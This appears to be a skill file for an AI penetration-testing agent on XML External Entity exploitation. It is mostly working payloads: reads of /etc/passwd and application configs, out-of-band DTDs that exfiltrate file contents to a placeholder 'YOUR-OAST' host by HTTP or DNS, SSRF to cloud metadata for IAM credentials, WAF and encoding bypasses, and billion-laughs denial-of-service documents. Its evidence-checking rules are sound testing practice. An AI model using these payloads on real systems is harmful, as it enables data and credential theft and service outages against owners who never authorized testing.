---
name: xxe
description: "XML External Entity exploitation including classic, blind OOB, SVG upload, and filter bypass techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
triggers: ["xxe", "xml external entity", "xml injection", "xml parsing vulnerability", "external entity", "blind xxe", "ootband xxe", "xml entity expansion", "billion laughs", "soap injection"]
contextBoosts: [api]
mitreAttack: ["T1203", "T1190"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration", "OWASP XXE"]
---

# XXE (XML External Entity) Exploitation

## When to Use

- Target accepts XML input: SOAP endpoints, RSS/Atom feeds, SVG uploads, XML-RPC, SAML assertions
- Content-Type is `application/xml`, `text/xml`, `application/soap+xml`, or `image/svg+xml`
- API endpoints that parse XML request bodies (REST or SOAP)
- File upload features accepting SVG files
- WSDL-defined services consuming XML payloads
- SAML SSO login flows that accept XML assertions

## Do Not Use

- Target clearly uses JSON-only APIs with no XML parsing
- Application returns generic "invalid format" errors without processing XML
- Target uses a WAF with strict XML schema validation (XSD) enforcement
- Content-Security-Policy blocks outbound connections for OOB exfiltration
- You have already confirmed XML parser has external entity loading disabled (`no-xml-external-entity`)

## Auth Context

XXE exploitation works regardless of authentication state in most cases. The vulnerability exists in the XML parser, not the application logic. However:

- Authenticated endpoints may expose more sensitive files (e.g., `/etc/shadow`, config files with credentials)
- SVG upload features often require authenticated sessions
- SOAP admin endpoints may require session tokens
- Always capture authentication headers first: `getCapturedHeaders` to retrieve session cookies and tokens
- If the target uses SAML SSO, the XXE in the SAML assertion itself can be exploited pre-authentication

## Classic XXE (In-Band)

In-band XXE returns the entity value directly in the application response. This is the most straightforward variant.

### Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Read Application Configuration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root>&xxe;</root>
```

For Java apps:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///WEB-INF/web.xml">
]>
<root>&xxe;</root>
```

### Read Windows System Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### Read Java Application Properties

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<config>&xxe;</config>
```

### Test for Vulnerability

Send this as a canary payload — if the parser resolves it, XXE is confirmed:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-OAST/canary-xxe-test">
]>
<root>&xxe;</root>
```

If the response contains the test value or no XML parsing error, the parser likely processes external entities.

## Blind / Out-of-Band (OOB) XXE

When the application does not return XML entity values in its response, exfiltrate data via DNS or HTTP callbacks.

### HTTP Callback Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/exfil.dtd">
  %xxe;
]>
<root>&send;</root>
```

Host the DTD on your OAST server (`YOUR-OAST`):

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%data;'>">
%param;
```

### Single-Payload Blind XXE (No External DTD)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &quot;exfil&quot; SYSTEM 'http://YOUR-OAST/?data=%xxe;'>">
  %eval;
]>
<root>&exfil;</root>
```

### DNS Exfiltration (When HTTP Outbound Is Blocked)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/dns-exfil.dtd">
  %dtd;
]>
<root>&send;</root>
```

The DNS DTD forces the parser to resolve a subdomain encoding the file contents:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY send SYSTEM 'http://%data;.YOUR-OAST/'>">
%param;
```

### Blind XXE with Error-Based Leak

If callback exfiltration is blocked, trigger an error that leaks data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &quot;error&quot; SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<root>&error;</root>
```

Host the error DTD:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY &quot;error&quot; SYSTEM 'file:///nonexistent/%data;'>">
%param;
```

The "file not found" error message in the response may contain the file contents.

## SVG Upload XXE

SVG files are XML. Injecting XXE payloads into SVG uploads can achieve code execution or file read on the server.

### Basic SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="50" font-size="16">&xxe;</text>
</svg>
```

### Blind SVG XXE via Image Rendering

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://YOUR-OAST/svg-exfil">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <image href="&xxe;"/>
</svg>
```

### SVG with External Image (SSRF + XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text>&xxe;</text>
</svg>
```

### SVG with XInclude (No DOCTYPE Control)

When the parser blocks DOCTYPE declarations but still processes XInclude:

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</svg>
```


### SVG Upload Checks

To test SVG upload endpoints:
1. Upload a benign SVG to confirm upload succeeds
2. Inject `<!DOCTYPE>` and `<!ENTITY>` declarations
3. Check if the server-side rendering returns the resolved entity value (in-band)
4. If not, use OOB callbacks in the SVG payload
5. Check if the server re-encodes or sanitizes the SVG before storage/display

## SOAP / WS-Federation XXE

SOAP messages are XML by definition. Target the SOAP body or envelope with XXE.

### SOAP Body XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <name>&xxe;</name>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### WS-Federation SAML Assertion XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Assertion [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Subject>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

### SOAP with OOB Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/soap-exfil.dtd">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>&send;</soap:Body>
</soap:Envelope>
```


## Parameter Entity XXE

Parameter entities (`%name`) are resolved within the DTD subset. They bypass restrictions that block regular entity declarations.

### Basic Parameter Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY test "%xxe;">
]>
<root>&test;</root>
```

### Parameter Entity with External DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/param.dtd">
  %xxe;
]>
<root>&send;</root>
```

External DTD (`http://YOUR-OAST/param-dtd`):

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%data;'>">
%param;
```

### Parameter Entity to Bypass WAF

WAFs often scan for `<!ENTITY` in the internal subset. Parameter entities allow you to move entity declarations into an external DTD, evading the WAF:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/waf-bypass.dtd">
  %xxe;
]>
<root>&send;</root>
```

External DTD:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://YOUR-OAST/?d=%data;'>">
%param1;
```


## Filter Bypass Techniques

### PHP `php://filter` (Read Base64-Encoded Source)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
```

Decode the Base64 output to recover the PHP source code.

### UTF-7 Encoding Bypass

If the parser expects UTF-7 but the WAF only scans for ASCII:

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-?xml version+ADs- +ACI-1.0+ACI- encoding+ADs- +ACI-UTF-7+ACI-+AD4-
+ADw-!DOCTYPE foo +AFs- +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

Note: UTF-7 bypass is rarely effective against modern parsers but useful for legacy systems.

### BOM (Byte Order Mark) Bypass

Prepend a UTF-8 BOM (`EF BB BF`) before the XML declaration to bypass parsers that only check the first bytes for `<?xml`:

```
\xEF\xBB\xBF<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### CDATA Wrapping Bypass

When input filtering blocks `<` or `>` characters, wrap the payload in a CDATA section:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>
```

### Double Encoding

If the application URL-decodes but the parser decodes again:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>%26xxe;</root>
```

### XML Schema Validation Bypass

When a strict XSD is enforced, inject XXE into fields that accept free-text:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="user.xsd">
  <name>&xxe;</name>
</user>
```

If all fields are validated, try injecting the DOCTYPE between the XML declaration and root element — some parsers still process it.

## XXE to SSRF

XXE can be used to make the server initiate HTTP requests to internal resources.

### Basic SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/secret">
]>
<root>&xxe;</root>
```

### SSRF to Cloud Metadata

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

AWS IAM credentials from metadata:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

### SSRF to Internal Services

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root>&xxe;</root>
```


Common internal targets:
- `http://internal-admin-service/` — admin panels
- `http://metadata.google.internal/` — GCP metadata
- `http://169.254.169.254/` — AWS/Azure metadata
- `http://localhost:6379/` — Redis
- `http://localhost:3306/` — MySQL (will return binary data)

## Billion Laughs DoS

XML entity expansion attacks consume memory exponentially. This is a denial-of-service payload.

### Classic Billion Laughs

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

This expands `&lol;` 10^9 times, consuming ~3 GB of memory.

### Quadrillion Laughs

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<root>&lol6;</root>
```

### Internal Entity Expansion (No External Entities)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "aaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
]>
<root>&e;</root>
```


**Warning:** Billion Laughs attacks cause real damage. Only use against targets you have explicit authorization to test. Document impact as a DoS finding with severity rating.

## Anti-Hallucination Rules

1. **Never claim file read without evidence.** If you send a `file:///etc/passwd` payload, you must see actual file content (UIDs, home directories) in the response. `root:x:0:0` is evidence. An empty response or generic error is not.

2. **Never claim blind XXE worked without a callback.** You must have an OAST callback with the expected data. If OAST shows no inbound request, the XXE did not fire.

3. **Never claim SVG XXE worked without rendering evidence.** The SVG must be processed by a server-side renderer (ImageMagick, librsvg, etc.). An uploaded SVG displayed as an image in a browser does not prove server-side parsing.

4. **Never claim DoS without measurement.** If you send a Billion Laughs payload, document the actual resource consumption or service disruption. "The payload is large" is not evidence of DoS.

5. **Distinguish parser behavior from vulnerability.** A parser that rejects external entities is not vulnerable. A parser that processes but returns errors is partially vulnerable. A parser that returns entity content is fully vulnerable.

6. **Verify with canary payloads.** Before attempting file reads, send `file:///dev/null` or `file:///nonexistent` to confirm the parser resolves entities at all.

7. **Always use `recordEvidence`** to capture the raw response containing entity resolution. Future analysis must see the actual data, not your summary.

8. **Never mix exploitation and reconnaissance.** First confirm the parser resolves entities (canary), then attempt targeted reads. Jumping to `/etc/shadow` without confirming entity resolution leads to false negatives.

9. **Document filter behavior.** If certain characters or keywords are blocked, record exactly what triggers the block. This informs bypass technique selection.

10. **Cross-reference with Response Gate.** If the LLM claims to have read a file but no entity content appears in the raw HTTP response, the Evidence Gate must reject the claim.

## Trigger Conditions

Activate when a request or response involves XML-family content: `application/xml`, `text/xml`, `application/soap+xml`, `image/svg+xml`, XML-RPC bodies, SAML assertions, RSS/Atom feeds, WSDL services, or file-upload endpoints that accept SVG/DOCX/XLSX (Office Open XML is zip-wrapped XML). Also trigger when a JSON endpoint silently accepts an XML body after switching `Content-Type` — a strong sign the parser is content-negotiating. Do not trigger on pure JSON APIs that reject non-JSON bodies with a hard schema error.

## Detection Approach

Reason in escalating order of intrusiveness. First confirm the parser processes XML at all: send well-formed XML matching the expected schema and observe a normal success response. Next, confirm entity resolution with a harmless internal entity (a defined `&ent;` whose value should appear reflected in output) — if it renders, in-band XXE is live. If entities are declared but the value does not reflect, pivot to blind: introduce an external parameter entity that triggers an outbound fetch to your OAST host; an inbound callback confirms external-entity loading even without in-band reflection. If DOCTYPE is blocked, switch to XInclude, which needs no `<!DOCTYPE>`. If both fail on JSON-first APIs, retry after flipping `Content-Type` to an XML variant. When in-band and callback both fail but errors are verbose, switch to error-based leak (force a parse error whose message embeds file contents). Choose file-read vs SSRF-via-XXE based on the environment: cloud metadata endpoints when the host looks cloud-hosted, local config/secrets when it looks like a traditional server.

## Pitfalls

- Treating input reflection as proof — reflection of your literal payload string is not entity resolution; only resolved entity *values* count.
- Assuming an SVG rendered in a browser proves server-side parsing; browser rendering is client-side and irrelevant.
- Missing OOB-only cases: a hardened parser may disable output but still fetch external DTDs, so absence of in-band data is not absence of vulnerability.
- Firing `/etc/shadow` or Billion Laughs before confirming basic entity resolution, producing false negatives or unnecessary DoS.
- Forgetting that CSP/egress filtering blocks OOB — a missing callback may mean network egress restrictions, not a patched parser; corroborate with error-based or in-band tests.
- Not stripping the DTD when the WAF blocks internal subsets — parameter entities in an external DTD often slip through.

## Verification & Impact

A finding is CONFIRMED when the raw response contains resolved entity content (e.g., `root:x:0:0` for a passwd read), a matching OAST callback carries the exfiltrated data, or an error message embeds file contents. It is SUSPECTED when entities appear declared/processed but no data is returned and no callback fires — record it as a candidate needing OOB confirmation. Document impact by concrete capability proven: local file disclosure (name the files), internal SSRF reach (name the internal host/metadata endpoint hit), credential theft from metadata, or DoS with measured resource impact. Always capture the full request/response pair via `recordEvidence`.
